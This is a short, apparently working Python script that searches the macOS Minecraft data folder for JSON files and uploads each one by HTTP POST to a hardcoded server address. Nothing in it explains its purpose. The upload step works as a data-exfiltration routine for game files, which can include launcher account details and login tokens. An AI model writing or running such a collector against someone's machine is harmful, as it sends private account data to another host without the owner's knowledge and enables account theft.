import os
import json
import requests

def find_json_files(directory):
    json_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith('.json'):
                json_files.append(os.path.join(root, file))
    return json_files

def send_file_to_server(file_path, server_ip):
    with open(file_path, 'r') as file:
        json_data = json.load(file)
    
    url = f'http://{server_ip}/upload'
    response = requests.post(url, json=json_data)
    
    if response.status_code == 200:
        print(f'Successfully sent {file_path} to {server_ip}')
    else:
        print(f'Failed to send {file_path} to {server_ip}. Status code: {response.status_code}')

def main():
    pwd = os.getcwd()
    target_directory = os.path.join(pwd, 'Library', 'Application Support', 'minecraft')
    server_ip = '192.168.0.119'
    
    if not os.path.exists(target_directory):
        print(f'The directory {target_directory} does not exist.')
        return
    
    json_files = find_json_files(target_directory)
    
    if not json_files:
        print(f'No JSON files found in {target_directory}.')
        return
    
    for json_file in json_files:
        send_file_to_server(json_file, server_ip)


main()
